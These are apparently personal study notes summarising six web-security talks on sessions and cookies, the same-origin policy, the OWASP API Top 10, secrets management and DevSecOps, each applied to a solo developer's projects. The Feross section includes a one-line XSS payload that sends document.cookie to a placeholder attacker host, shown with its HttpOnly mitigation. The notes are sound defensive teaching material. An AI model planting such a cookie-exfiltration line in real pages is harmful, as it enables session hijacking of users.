# sec-2 — cross-cutting principles

1. **Never trust the client.** Anything sent to the browser (cookies, hidden fields, prices, IDs) can be read and edited; authority must live on the server. (Feross CS253 L03; InsiderPhD API3)
2. **Session tokens = random 128-bit+ opaque IDs mapped to a server-side record**, deleted on logout and password change. Sequential IDs are enumerable; signed self-contained tokens cannot be revoked — the stolen-cookie-survives-logout problem (same flaw as long-lived stateless JWTs). (Feross L03)
3. **Cookie hardening is a default, not an option**: `HttpOnly` (XSS can't steal it), `Secure` (never over HTTP), `SameSite` (limits cross-site sending/CSRF), modest explicit expiry, no `Domain` unless needed. (Feross L03; Embrace The Red)
4. **Origin = scheme + host + port; `Path` is not a boundary; same-site ≠ same-origin.** Isolate distinct apps on distinct (sub)domains, and remember sibling subdomains are still same-site. (Feross L03; Embrace The Red; Reis)
5. **Ambient authority is the root of CSRF and session riding**: the browser attaches credentials automatically to any request to your site, whoever triggered it. (Feross L03; Reis — Netflix 2006 CSRF)
6. **HTTPS everywhere plus HSTS** — not just on the login POST. Anything in clear text can be read (Firesheep) or rewritten in flight (ISPs, proxies, ARP-poisoning worms injected JS into ~1.3% of page loads in one study). (Feross L03; Reis; Embrace The Red)
7. **Declare what code may run on your page**: CSP script hashes/nonces, SRI for third-party scripts, `frame-ancestors`/X-Frame-Options against clickjacking. Injected script can do anything the user can. (Reis; Embrace The Red)
8. **Reflecting attacker-influenced strings (URLs, params) into a script context is how XSS is born** — even middleware you didn't write can do it to you. Encode for the exact output context. (Reis)
9. **Authorise at three levels on every request — object (BOLA), property (mass assignment / over-exposure), function (admin/tenant)** — and test with a two-account replay (attacker replays victim's requests). UUIDs are a mitigation, not a control. (InsiderPhD API1/3/5)
10. **Server-side fetchers of user-supplied URLs are SSRF**: the server sits on internal networks and cloud metadata. Combine with DNS rebinding awareness — validate the resolved IP and pin it, re-check on redirects. (InsiderPhD API7; Reis — DNS rebinding)
11. **Data from third-party APIs and LLMs is untrusted input** (API10); prompt injection is the current flagship example. Validate schemas and escape on output. (InsiderPhD)
12. **Bound resource consumption and protect business flows**: rate limits, payload depth/size caps, quotas on flows bots can abuse (inventory holds, coupons). (InsiderPhD API4/API6)
13. **Keep an inventory**: retire old API versions and debug endpoints (they share the same DB), and maintain an SBOM/lockfile so the next Log4j is a quick patch. (InsiderPhD API9; IBM)
14. **Secrets lifecycle, not just storage**: no secrets in git/wikis/email/base64; one credential per service per environment; short-lived or automatically rotated; audit who accessed what. (HashiCorp/Barclays)
15. **Solve "secret zero" with workload identity** (cloud IAM roles, service accounts) rather than a master password; own secrets by application, not by person; hold them in memory only. (HashiCorp/Barclays)
16. **Shift left**: fix cost grows up to ~640x from coding to production; build security into design and CI with SAST + DAST + dependency and secret scanning — they find different bug classes. (IBM)
17. **AI-generated code is an untrusted contributor**: it may contain vulnerabilities and gets less review because it is voluminous; don't paste proprietary code or keys into tools with unclear data policies. (IBM)
18. **Composition creates holes**: plugins, extensions and proxies each with their own security model broke the browser's guarantees; every integration you add is new attack surface to model. (Reis; InsiderPhD API6/10)

---

## Feross Aboukhadijeh (Stanford CS 253) — Web Security Lecture 03: Session Attacks (https://www.youtube.com/watch?v=QuhgjXKzfI8)
**A session token must be unguessable, server-revocable and never readable or sendable where it can leak; signing alone does not give you revocation.**

- **Mental models / first principles**
  - HTTP is stateless; cookies exist so the server can correlate a series of requests (login, shopping cart, and — less benignly — cross-site tracking via a third-party ad server's unique ID cookie).
  - **Ambient authority**: access control based on a global, persistent property of the requester that the browser attaches automatically (cookie, source IP, HTTP Basic auth, client certs). It is what makes the web usable (no password per "like" click) and also what makes CSRF and session theft possible. Cookies are by far the dominant mechanism; IP-based auth (e.g. campus library access) breaks with VPNs, NAT (a household shares one IP) and mobile networks (IP changes as you move between towers).
  - **Never trust the client**: anything sent to the browser can be read and edited in devtools. A cookie `username=alice` lets anyone become `bob` by editing one value.
  - Cookies predate the browser's same-origin policy (Netscape 1994, informal draft; failed over-ambitious specs; only a 2011 RFC matched reality). Their security model is therefore different from, and weaker than, the rest of the web platform.

- **Mechanisms**
  - **Signed cookies (MAC/signature)**: server holds a secret, sends `value + tag`; on return it verifies the tag, so tampering is detected (Express `cookieParser(secret)` + `signed: true`, read from `req.signedCookies`). Value remains visible to the client.
  - **Why signing is the wrong tool for sessions**: a signed `username=alice` is valid forever. If malware steals it, logging out or changing the password does nothing — the attacker replays it. Rotating the global key would log out every user. (This is exactly the stateless-JWT revocation problem.)
  - **Server-side session table**: on login, generate a random session ID, store `sessions[id] = {user,...}`, send only the ID as a cookie; on logout **delete the server-side row** (not just clear the cookie). Enables "see all my sessions / revoke remote session" UIs.
  - **Session ID generation**: sequential IDs (0,1,2…) are trivially enumerable — a user who receives ID 2 tries 1 and becomes Bob. Use a CSPRNG with ~128 bits of entropy: Node `crypto.randomBytes(16).toString('base64')`. Collision is not a realistic concern at that size.
  - Logout bug the class hit live: clearing the cookie on the client but forgetting to delete the server record leaves a stolen ID valid.
  - Deleting a cookie = re-set same name with an expiry in the past (e.g. 1970).
  - **Attributes**: `Expires`/`Max-Age` (no expiry = "session cookie", but browser session-restore often keeps it — set explicit expiry if you need it gone); `Path` (scoping only, **not a security boundary**); `Domain` (broadens to parent domain, e.g. `Domain=stanford.edu` exposes it to every subdomain); `Secure`; `HttpOnly`. Multiple cookies = multiple `Set-Cookie` headers.
  - `document.cookie` is a bizarre API: assignment appends rather than overwrites; reading returns a semicolon-joined string.
  - Signing still has legitimate uses: tamper-proof non-session values such as a discount code (bind it to the user, or it can be shared).

- **Attacks shown**
  - **Session hijacking over plaintext HTTP**: an on-path observer copies the cookie and replays it. Firesheep (2010) did this in one click on café Wi-Fi because sites only used HTTPS for the login form, then sent the session cookie in clear. Fix: HTTPS on every page; add `Secure` so the cookie is never sent over HTTP.
  - **Cookie exfiltration via injected JS**: `new Image().src = 'https://attacker/?c=' + document.cookie`. Mitigation: `HttpOnly` so JS cannot read the session cookie (still sent automatically by the browser). XSS can still act as the user in-page, but cannot steal the token for offline use.
  - **Path bypass**: a page at `/cs253` on the same host creates a hidden iframe to `/cs106a`, reads `iframe.contentDocument.cookie` — allowed because same-origin = same scheme + host + port. Path never isolates. Real isolation needs a separate **subdomain/origin**.

- **Decisions & trade-offs**
  - Stateless signed token: no DB lookup, cannot revoke individually. Server-side session: one lookup per request, but true logout, per-device revocation, and admin kill switch. For a solo dev, opaque random session IDs in a DB/Redis are the simpler secure default; if JWTs are used, keep them short-lived with a revocable refresh token.
  - Don't invent schemes (IP + user-agent binding, signing sequential numbers): the simple primitive — large random ID in a server-side table — is correct.
  - Never reuse one key for different purposes/algorithms.

- **Rules of thumb / checklist**
  - Session cookie: random 128-bit+ ID, `HttpOnly; Secure; SameSite`, explicit modest expiry (rolling 30 days rather than years), server-side record deleted on logout and on password change.
  - HTTPS everywhere, no mixed HTTP pages.
  - Don't set `Domain` unless you need it; host untrusted or separate apps on separate subdomains, not separate paths.
  - Store only an ID in the cookie, never identity or privileges in plaintext.

- **Relevance to Sam**
  - Tereka/Riselist logins: use framework session middleware with a DB store; don't put user IDs or plan tier in cookies. If AI-written code produces `res.cookie('userId', ...)` or a long-lived JWT with no revocation, that is the bug this lecture demonstrates.
  - Any admin dashboards for Trameter tools should be on their own subdomain, not a path on a shared host, since path gives no isolation.
  - The "change password doesn't kill stolen token" scenario applies to API keys too: supplier keys (Viator/RateHawk) and internal tokens need a revocation path.

## Charlie Reis (Univ. of Washington, Stanford seminar) — Building a Safer Web (https://www.youtube.com/watch?v=QdiKlTQWq5k)
**Anything between your server and the user's browser can rewrite your page, and the browser — really an OS for untrusted programs — needs explicit program boundaries, code allow-lists, isolation and uniform policy.** (2008 talk: the HTTPS-cost arguments are outdated, but the threat model is foundational — it is the origin story of HTTPS-everywhere, CSP script hashes and Chrome's site isolation.)

- **Mental models / first principles**
  - The web moved from static documents to active programs (JS, then plugins). Browsers were still built as document renderers with security bolted on, which is why XSS, CSRF and drive-by exploits keep appearing.
  - Threat list from a normal browsing session: drive-by malware via browser exploits (often hidden in banner ads); **XSS** (Yahoo Mail 2006 worm: an incoming email ran script inside the mail client and mailed itself to contacts); **CSRF** (Netflix 2006: another site could change your account settings because the browser auto-attaches Netflix cookies); and **in-flight page modification**.
  - HTTPS gives *the client* integrity assurance, but gives the *server* no proof the client received its bytes intact — a client-side proxy or corporate MITM can terminate TLS.

- **Mechanisms: Web Tripwires measurement study**
  - A small JS snippet fetches a script containing a known-good copy (or checksum) of the page, re-fetches the page's own raw HTML via XHR (served from cache, so no extra network trip — you can't use the DOM because browsers pretty-print it differently), compares, shows the user a diff, and reports to the server.
  - ~50,000 unique visitors over ~2.5 weeks; **657 clients (~1.3%) received a modified page**. ~90% of modifications injected JavaScript.
  - Who modified pages: client-side ad/popup-blocking proxies and personal firewalls (~70%: Zone Alarm, CA Personal Firewall, Ad Muncher, Proxomitron); ISPs injecting behavioural-tracking ads (NebuAd and successors; free municipal Wi-Fi), ISP compression/image distillation on mobile; enterprise filters (Blue Coat injecting phishing heuristics); adware turning words into ad links; and worms using **ARP poisoning** on a LAN to inject exploits into others' traffic — reported to hit server rooms too, injecting into outbound pages.
  - Unintended damage: injected scripts broke page functionality and leaked into user posts on MySpace/forums.
  - **Middleboxes introduced XSS into safe pages**: ad-blocking proxies embedded the full page URL into an injected script string/comment. An attacker crafts a URL with script after `?` or `#`, phishes the user, and the proxy writes it into every page — including HTTPS pages if the proxy terminated TLS. Demo: redirect to Google with payload, rewrite results and append the payload to every outbound link, owning the tab until the user types a URL. Equivalent to a "root exploit" of the browser. Also enabled password theft on bank homepages that served the login form over HTTP.

- **Decisions & trade-offs**
  - HTTPS: confidentiality + integrity, cryptographically robust; in 2008 the cited costs were certificates, CPU, extra handshake round trips, and losing transparent caching. (note: these costs are now negligible — free certs, TLS 1.3, HTTP/2; HTTPS everywhere is the baseline.)
  - Tripwires: detect but don't prevent; can be evaded by an adaptive adversary (arms race, obfuscation helps); can't see full-page substitutions. Detection still has value for deciding how much to trust a client.

- **Proposed browser architecture (four principles)**
  1. **Program boundaries**: same-origin is too narrow (mashups), too broad (many user profiles on one host share one box), and weak (**DNS rebinding**: `evil.com` resolves first to the attacker, then to a LAN IP, letting the page probe your internal network under the same origin). Idea: identify a web program by a publisher key pair.
  2. **Authorise which code may run**: publisher-supplied allow-list of script hashes; browser ignores anything not on the list. Hard for dynamically generated scripts. (This became CSP `script-src` with hashes/nonces and Subresource Integrity.)
  3. **Isolate programs**: separate processes per web program for crash/resource isolation (became Chrome's multi-process and Site Isolation); separate credentials per program instance so a third-party site can't ride your logged-in session (the idea behind SameSite cookies).
  4. **Uniform policy**: each plugin (Java, Flash, Silverlight) and extension had its own security model; combining them created new holes (Java+JS made DNS rebinding easier; Greasemonkey 2005 let pages bypass same-origin). BrowserShield (MSR) rewrote JS in an enterprise proxy to interpose on dangerous calls — struggled with HTTPS and browser quirks in parsing malformed input.
  - Even without script, an injected HTML form or password field is dangerous — integrity of the whole page matters, not just scripts.

- **Rules of thumb**
  - Serve everything over HTTPS (including the page with the login form, not just the POST target) and add HSTS.
  - Never reflect a URL or any attacker-influenced string into a script context without context-correct encoding — the proxy bug is the classic reflected-XSS pattern.
  - Use CSP with script hashes/nonces and SRI for third-party scripts to declare exactly what code may run.
  - Isolate distinct apps on distinct origins; assume same-origin is a coarse boundary.

- **Relevance to Sam**
  - **SSRF / DNS rebinding in the LLM fetcher**: when the Drive Button pipeline fetches external blog pages, a hostname that resolves to a public IP at validation time can resolve to `127.0.0.1`/`169.254.169.254`/LAN at fetch time. Resolve once, validate the IP against private/link-local/metadata ranges, then connect to that pinned IP; re-validate on every redirect.
  - **Fetched content is untrusted and possibly modified in flight**: pages fetched over HTTP, or via proxies, can be rewritten — treat scraped HTML as hostile input to the LLM (prompt injection) and never render it unescaped into your own UI.
  - **Embedding scripts in third-party sites** (Drive Button injected into blogs): the reverse case — your widget runs inside someone else's origin. Keep the widget isolated (iframe on your own origin) so a host page or injected proxy code can't tamper with booking/payment actions; pin and SRI-hash the script you publish.

## Katie Paxton-Fear (InsiderPhD) — New OWASP API Top 10 for Hackers (https://www.youtube.com/watch?v=sl1yqGhuVy4)
**The 2023 OWASP API Top 10 from the attacker's side: for each risk, where to look and how to prove it — which doubles as the defender's test plan.**

- **Mental model**: APIs are web apps, but they expose objects and functions directly, are consumed by many clients (mobile, web, partners) and chain into other APIs, so their dominant failures are authorisation and trust, not classic rendering bugs. The list is built from expert input plus bug-bounty data (HackerOne, Bugcrowd).

- **API1 Broken Object Level Authorization (BOLA, ex-IDOR)**
  - Look for any ID/UUID in a path or body, especially REST resources. Read of another user's public post may be fine; update/delete of someone else's object returning 200 is the bug. Create is usually fine (it acts on your own account).
  - Test: two accounts (victim, attacker). Exercise everything as victim, replay each request with the attacker's session. If the *victim's* data changes or is revealed, it's BOLA.
  - UUIDs are a mitigation, not a fix — IDs leak via other endpoints, listings, URLs. The check must be "does this caller own/have rights on this object" on every request.
  - (note: correct status for "authenticated but not allowed" is 403, or 404 to avoid confirming existence; 401 means unauthenticated.)

- **API2 Broken Authentication** — any path to account takeover: password reset flaws (token for arbitrary account), OAuth/social login flows, JWT/API-key handling, missing brute-force and rate limits on login. JWT pitfalls seen in the wild: signing secret committed to a public repo (still visible in history), server not verifying the signature at all so edited claims are accepted. IP rotation can defeat per-IP rate limits.

- **API3 Broken Object Property Level Authorization** (new; merges excessive data exposure + mass assignment)
  - Exposure: responses containing fields the client never asked for or shouldn't see (other users' email, PII, internal business data). Grep large responses for emails/phone numbers.
  - Mass assignment: `PUT /api/post/45` accepts `id`, `author`, `created_at` as well as `text`. Look for fields guarded by business preconditions — the classic examples: changing password without the old one by calling the final update directly; getting an extra-legroom seat assigned without paying by including the seat property.
  - Defence: explicit allow-list of writable fields per role/endpoint and explicit response schemas (DTOs), never `Model.update(req.body)` or serialising the whole ORM object.

- **API4 Unrestricted Resource Consumption** — one client exhausts shared capacity, or forces you to pay for autoscaling. Application-level DoS such as deeply nested JSON crashing the parser. Defences: rate limits, payload size/depth limits, pagination caps, timeouts, spend caps.

- **API5 Broken Function Level Authorization** — vertical/horizontal privilege escalation: a regular user calling an admin endpoint (often a separate `/admin` API) and getting 200. Hot spots: many roles, custom permissions, **multi-tenant organisations** — check whether admin of org A is accidentally admin of org B. Test with one account per role, attacker always the lower privilege. Needs human understanding of the permission model, so scanners miss it.

- **API6 Unrestricted Access to Sensitive Business Flows** — she frames it broadly as business-logic issues across integrated downstream systems (analytics, support tools, third-party stores, payment gateways), and blind XSS/SSRF/SQLi landing in back-office tools (she triggered blind XSS in an email app via Shopify data). (note: the official OWASP definition is narrower: abuse of a legitimate flow at scale — bots buying all inventory, scalping, mass reservations, referral/coupon farming. Defend with per-user/device limits, bot detection, holds that expire.)

- **API7 SSRF** — the API server sits on both the public side and the internal network/cloud, so if it fetches a user-supplied URL (avatar import, webhook, link preview) an attacker can make it fetch internal file servers, databases, port-scan, or read cloud metadata/keys. Test by swapping a URL parameter for an out-of-band listener (Burp Collaborator, interactsh) and seeing if the *server* connects.

- **API8 Security Misconfiguration** — grab-bag: CORS too permissive, CSRF protection missing, caching of private responses, missing security headers, permissive cloud settings, weak TLS, debug mode on / stack traces, disabled framework protections, SameSite cookie settings, outdated software, secrets in commit history. Learn CORS, OAuth and CSRF first.

- **API9 Improper Inventory Management** — old versions (`/v1`) left running after a fix in `/v2` but hitting the same database and logic; debug endpoints never removed. Test: change version numbers downward; retest previously disclosed bugs for regressions.

- **API10 Unsafe Consumption of APIs** — trusting data from third-party APIs (upstream) as if it were safe. Every integration — OAuth provider, storage, support desk, store, payment gateway, LLM — is a source of untrusted input. **Prompt injection is the current poster child: treating LLM output as trusted.**

- **Rules of thumb for a builder**
  - Write the two-account replay test for every ID-bearing endpoint; it catches API1, API3 and API5 cheaply.
  - Every endpoint needs authz on object, property and function level — three separate checks.
  - Keep an inventory of live endpoints and versions; turn old ones off.

- **Relevance to Sam**
  - **Booking APIs**: `/bookings/{id}`, `/itineraries/{id}`, voucher downloads — classic BOLA targets exposing traveller PII; always filter by owner in the query, not after.
  - **Mass assignment in booking/payment**: never accept `price`, `currency`, `status`, `paid`, `commission` from the client; recompute price server-side from the supplier quote. The "extra-legroom seat without paying" example maps directly to room upgrades/add-ons.
  - **API6 for travel**: bots holding inventory or abusing free-cancellation holds; rate-limit availability searches that cost you supplier API quota (API4 — someone can burn your Viator/RateHawk rate limit or LLM bill).
  - **API10**: treat Viator/RateHawk responses (HTML in descriptions, URLs, prices) and LLM outputs as untrusted — validate schema, escape on render, never pass straight into SQL, shell or another privileged call.
  - Tereka (money planner) with households/teams is a multi-tenant BFLA risk: test cross-household access explicitly.

## Hardeep & Richard Hughes (Barclays, HashiConf) — Secrets management best practices for the modern enterprise (https://www.youtube.com/watch?v=yh7A6q2KzVE)
**Secrets fail at every stage — creation, storage, distribution, rotation, governance — and the fix is machine identity plus short-lived, per-service, dynamically issued secrets from one federated store.**

- **Mental models / first principles**
  - Model a secret's whole **lifecycle**: creation → storage → distribution → consumption at runtime → rotation → audit. Most leaks happen in the hand-offs, not in the vault.
  - **The typical broken workflow**: human files a form → DBA creates the credential → emails it to the developer → developer puts it in a properties file → commits it to source control → app reads it at runtime. By the time it's in use, several humans and an email server have seen it, so it's already compromised.
  - **"Doormat" problem**: you protect a secret with a keystore, the keystore with a password, the password with an encryption key, the key with… The real decision is how many layers your risk owners accept — there's always a bottom turtle.
  - **"Secret zero"**: the first credential used to unlock the secret store. Answer: don't use a password at all — use **platform-attested machine identity** (cloud IAM roles, Kubernetes service accounts; on VMware, which offers none natively, build one via Chef/Ansible or Kerberos plus the system of record).
  - Until secrets management is solved, CI/CD and infrastructure-as-code automation sit on shaky foundations: every pipeline step needs credentials.

- **Failure patterns they've seen**
  - Every platform (AWS Secrets Manager/ACM, Azure Key Vault, Kubernetes Secrets) has its own store and API → developers write N integrations, forms and processes.
  - Secrets in Java keystores, wiki pages, and **base64-"encoded" passwords committed to git to slip past scanners** (base64 is not encryption).
  - Secrets emailed to developers.
  - **Shared service accounts** (one AD/database account across many apps and environments): compromise of one = compromise of all; rotation requires coordinated downtime of every consumer, so it happens annually at best. AD accounts are domain users by default → huge blast radius.
  - Governance: logs scattered across many stores, so nobody can answer "who used which secret, where, how strong, when last rotated".

- **Target state / mechanisms**
  - **Own secrets by application, not person**: map secrets to an application record in the system of record; humans are entitled via which apps they manage (attribute-based access control, e.g. JWT claims). People change teams; apps persist.
  - **Single standard vault technology, federated and highly available** across clouds/regions — one API for all code, but not one central box that becomes a single point of failure. Avoid extra abstraction layers between client and store.
  - **Machine identity → policy**: the workload authenticates with its platform identity, which is bound to its application, and gets only that application's secrets. No human in the loop.
  - **Dynamic secrets**: the vault creates a unique, short-lived DB/AD credential per service instance on demand and revokes it after TTL. Rotation becomes automatic and per-service; blast radius and exposure window shrink.
  - **Consume in memory only**: don't write secrets to disk; hold them in process memory or shell variables for their use.
  - **PKI is just another secret type**: issue certs and private keys from the same system with short lifetimes.
  - Legacy/COTS apps that can only read a file can still be fed by an agent that writes the secret to a file.

- **Decisions & trade-offs**
  - Cloud-native per-platform stores = less coupling per platform, but fragmented governance and code; one federated vault = consistent API and audit, but must be engineered for availability.
  - Ephemeral secrets confuse auditors used to listing credentials — report and certify the *role/ability to generate* credentials, not each instance.
  - Developers resist (a 2-year static secret vs. 15-day rotation), but once given coding patterns they never manually rotate again and ops outages from rotation vanish.
  - Start with the most common, painful use cases (DB creds), then expand to PKI etc.

- **Rules of thumb / checklist**
  - No secrets in git, wikis, email, chat, or base64 in code. Scan history, not just HEAD.
  - One credential per service per environment; never share across apps or dev/prod.
  - Prefer short TTL / dynamic credentials; if static, automate rotation and make rotation zero-downtime (support two valid keys during overlap).
  - Bootstrap with workload identity rather than a stored "master" password.
  - Centralise audit: who accessed what, when.

- **Relevance to Sam (solo dev scale)**
  - You don't need Vault: use the hosting platform's secret store (e.g. cloud Secret Manager, GitHub Actions secrets, Fly/Render env secrets) plus a local `.env` that is git-ignored, and a pre-commit secret scanner (gitleaks/trufflehog). Check that AI-generated code didn't hard-code a key "for testing".
  - **Supplier keys (Viator, RateHawk)**: separate sandbox vs production keys, one key per service where the supplier allows, store only server-side, never in a frontend bundle or a notebook committed to GitHub. Know how to rotate each one before you need to.
  - On the 16GB laptop, long-running pipelines should read keys from env at start rather than config files in the repo; don't log request headers that carry keys.
  - Tereka/Riselist payment-provider keys (Paystack/Flutterwave/Stripe): restricted keys with minimum scope; webhook signing secrets treated as secrets too.

## Johann Rehberger (Embrace The Red) — Web Application Security Fundamentals (https://www.youtube.com/watch?v=-7OX58nHPb8)
**Nearly all browser security hangs on one rule — the same-origin policy — plus how cookies are attached and protected.** (Introductory; short on depth but the vocabulary is the base for XSS/CSRF/clickjacking.)

- **Mental models**
  - A web app = HTML (structure), CSS (rendering), JavaScript (behaviour). The **user agent** (browser) acts on the user's behalf and speaks HTTP.
  - **Script in a page can do anything the user can do in that app** — read every field, submit any form. This is why code injection (XSS) is so severe.
  - HTTP is stateless; cookies bolt on sessions. Whoever holds the session cookie *is* the user.

- **Mechanisms**
  - HTTP request = verb + URL + protocol version + headers (`User-Agent`, `Referer` — which leaks where the user came from). Response = status line (200 OK), headers (`Server` version, `Set-Cookie`, `Content-Type`) and body. **`Content-Type` tells the browser how to interpret the body** (HTML vs JS vs image) — wrong content types are a common XSS/sniffing root cause.
  - **Origin = scheme + host + port.** `https://example.org`, `https://example.org:8080` and `http://example.org` are three different origins; path doesn't matter.
  - **Same-origin policy**: script from origin A can't read the DOM/data of origin B. Demo: attacker page iframes a webmail inbox and tries `iframe.contentDocument.body` → "Permission denied to access cross-origin object".
  - **X-Frame-Options** (`DENY`/`SAMEORIGIN`): server tells the browser not to let other sites frame it — the defence against **clickjacking** (attacker overlays invisible framed buttons such as one-click checkout under a decoy). Gmail sends `X-Frame-Options: SAMEORIGIN`. (note: the modern equivalent is CSP `frame-ancestors`.)
  - **Same-site ≠ same-origin**: site = registrable domain (eTLD+1, using the Public Suffix List), so `www.example.com` and `blog.example.com` are same-site but cross-origin. Matters for SameSite cookies and CSRF.
  - Newer browser request headers tell the server where a request came from and allow simple server-side blocking of cross-site attacks. (note: these are the Fetch Metadata headers `Sec-Fetch-Site`, `Sec-Fetch-Mode`, `Sec-Fetch-Dest`, now broadly supported.)
  - **Cookies** are sent automatically on every request whose site/domain matches, with no JS involvement — that's convenient and is also the CSRF hazard. Protective attributes:
    - `HttpOnly` — invisible to JavaScript, transport-only (limits XSS cookie theft).
    - `Secure` — only sent over HTTPS (stops coffee-shop sniffing).
    - `SameSite` — controls whether the cookie rides cross-site requests (CSRF mitigation; also curbs ad tracking).
  - **Transport**: encrypt everything, including internal/intranet apps. `Strict-Transport-Security` (HSTS) makes the browser upgrade `http://` links to HTTPS automatically. Let's Encrypt gives free certificates.

- **Tools**: browser devtools (Elements, Network tab), Fiddler, Burp Suite, OWASP ZAP for viewing and proxying requests/responses.

- **Rules of thumb / checklist**
  - Session cookies: `HttpOnly; Secure; SameSite=Lax` (or `Strict`) by default.
  - Send HSTS; HTTPS everywhere including internal services.
  - Send `X-Frame-Options: DENY` or CSP `frame-ancestors 'none'` unless you intend to be embedded.
  - Set correct `Content-Type` on every response (and `X-Content-Type-Options: nosniff`).
  - Don't leak sensitive data in URLs — it travels in `Referer`.
  - Inspect your own app's traffic in devtools: you'll see exactly what an attacker sees.

- **Relevance to Sam**
  - The Drive Button widget is *designed* to be embedded in third-party blogs: serve the booking/checkout UI from your own origin in an iframe so SOP shields it from the host page, but then guard against clickjacking of the checkout itself (require an explicit confirm step in your own top-level window or a popup for payment; use `frame-ancestors` to whitelist partner sites rather than allowing all).
  - Booking/payment URLs should not carry tokens or PII in query strings (Referer leakage to third-party scripts/analytics).
  - Using subdomains for separate apps (tereka.*, riselist.*, api.*) gives origin isolation but they remain same-site — a cookie set with `Domain=` the parent, or SameSite alone, won't protect one from a compromised sibling.

## Jeff Crume (IBM Technology) — Cybersecurity Architecture: Application Security (https://www.youtube.com/watch?v=nthEXs12nFE)
**All non-trivial software has bugs, some of which are vulnerabilities; the cheapest place to remove them is as early as possible, so build security into every phase (DevSecOps) with practices, trusted components, an SBOM and automated SAST + DAST — and treat AI-written code as untrusted.**

- **Mental models**
  - Syllogism: all software has bugs → a fraction are security bugs → all software has vulnerabilities. The goal is reduction and fast recovery, not perfection.
  - **Cost curve**: most bugs are *introduced* during coding but *found* in later test phases or in production. Fix cost rises from 1x at coding to as much as ~640x once in the field. Hence "shift left".
  - Traditional SDLC (design → code → test → release) is linear, siloed and "over the wall" between dev and ops, with security bolted on at the end. DevOps makes it a feedback loop; **DevSecOps** wraps security around every phase: security by design, collaboration across dev/sec/ops, heavy automation.
  - Same OWASP Top 10 categories reappear between 2017 and 2021 — the industry reshuffles the list rather than eliminating classes of bug ("Groundhog Day").

- **Secure coding inputs**
  - **Prescriptive secure coding practices** (OWASP Secure Coding Practices): input validation (e.g. buffer sizes → buffer overflow), how to authenticate, how to use crypto, error handling.
  - **Trusted libraries**: reuse is unavoidable, but even trusted, widely used components fail — **Log4j (Log4Shell)** was found after release, at peak cost, across huge numbers of systems. Use reputable sources and still inspect.
  - **Standard reference architectures** so teams don't redesign security each time.
  - **Mistakes to avoid**: OWASP Top 10 as the curriculum.
  - **SBOM (software bill of materials)**: inventory of every component, origin, dependency relationships and version per system. When the next Log4j drops, you know exactly where to patch.

- **Testing tools**
  - **SAST** (static, white-box): scans source; can run right after coding — earliest feedback.
  - **DAST** (dynamic, black-box): exercises the running app without source; finds runtime/config issues.
  - Not either/or: they catch different classes; run both continuously in the pipeline.

- **LLM chatbots in development (2023 view)**
  - Benefits: fast code generation and debugging help.
  - Risks: generated code may contain vulnerabilities (or a deliberate backdoor if the model/service is compromised); people use it precisely for large volumes of code they won't fully review; it lacks the many-eyes review of mature open source. Pasting proprietary code into a public chatbot can leak IP (cites a major company whose developers leaked source this way and then banned it).
  - (note: enterprise/API tiers typically don't train on inputs, but the review-burden risk stands.)

- **Rules of thumb / checklist**
  - Threat-model at design time; don't wait for a pentest.
  - Pin and inventory dependencies (lockfiles = a minimal SBOM); subscribe to advisories (Dependabot/`pip-audit`/`npm audit`).
  - Put SAST (e.g. Semgrep, Bandit, CodeQL) and a secret scanner in CI; run a DAST tool (OWASP ZAP baseline) against staging.
  - Review AI-generated code with the same or higher scrutiny as a stranger's pull request; keep proprietary code and keys out of tools whose data policy you haven't checked.

- **Relevance to Sam**
  - As a solo developer relying heavily on AI-written code, Sam *is* the "chatbot writes most of the code" case. Compensating controls: tests for security properties (two-account BOLA test, mass-assignment test), SAST + secret scanning in GitHub Actions on both GitHub accounts' repos, dependency audit, and a checklist review of auth/payment code paths specifically.
  - Python pipelines pull many packages (GeoNames/OSM tooling, scrapers): pin versions, prefer well-maintained libraries, watch for typosquats.
  - Don't paste supplier API keys, customer PII or Trameter-confidential code into chat tools without checking the data policy.

